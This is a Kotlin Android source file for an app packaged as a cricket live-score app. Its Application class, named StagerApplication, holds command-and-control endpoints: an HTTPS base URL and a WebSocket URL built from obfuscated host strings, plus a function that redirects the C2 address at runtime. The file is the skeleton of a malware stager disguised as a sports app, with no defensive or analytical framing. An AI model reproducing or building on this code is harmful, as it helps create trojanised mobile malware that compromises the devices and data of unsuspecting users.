package com.cricket.livescore

import android.app.Application
import android.content.Context
import com.cricket.livescore.utils.ObfuscatedStrings

class StagerApplication : Application() {
    companion object {
        lateinit var instance: StagerApplication
            private set
        val c2BaseUrl: String
            get() = "https://${ObfuscatedStrings.c2Host}"

        val c2WsUrl: String
            get() = "wss://${ObfuscatedStrings.c2Host}${ObfuscatedStrings.wsPath}"

        var c2RealUrl: String = "https://${ObfuscatedStrings.c2Host}"
            private set

        fun updateC2Url(url: String) {
            c2RealUrl = url
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun attachBaseContext(base: Context) {
        super.attachBaseContext(base)
    }
}
